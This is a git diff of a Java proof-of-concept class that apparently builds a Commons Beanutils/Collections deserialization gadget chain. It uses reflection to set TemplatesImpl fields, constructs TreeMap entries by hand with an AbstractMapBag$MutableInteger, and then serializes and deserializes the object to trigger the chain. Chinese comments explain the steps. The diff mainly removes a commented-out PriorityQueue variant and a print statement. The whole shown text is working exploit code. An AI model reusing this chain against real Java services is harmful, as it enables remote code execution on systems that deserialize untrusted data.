@@ -37,10 +37,6 @@ public class cb {
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
         BeanComparator comparator = new BeanComparator(null);
 
-
-//        Queue queue = new PriorityQueue(2, comparator);
-//        queue.add(1);
-//        queue.add(1);
         setFieldValue(comparator, "property", "outputProperties");
 
 
@@ -49,14 +45,12 @@ public class cb {
         setFieldValue(m, "size", 2);
         setFieldValue(m, "modCount", 2);
 
+        //这一部分相当于执行了TreeMap.put()
         Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
         Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
         nodeCons.setAccessible(true);
         Object MutableInteger = createWithoutConstructor("org.apache.commons.collections.bag.AbstractMapBag$MutableInteger");
-
-        
         Object node = nodeCons.newInstance(obj,MutableInteger, null);
-        
         Object right = nodeCons.newInstance(obj, MutableInteger, node);
 
       //为了保证在序列化时能够正常的遍历
@@ -81,8 +75,8 @@ public class cb {
         ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(barr.toByteArray());
 
         ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
-        Object o = objectInputStream.readObject();
-        System.out.println(o);
+        objectInputStream.readObject();
+
 
 
     }
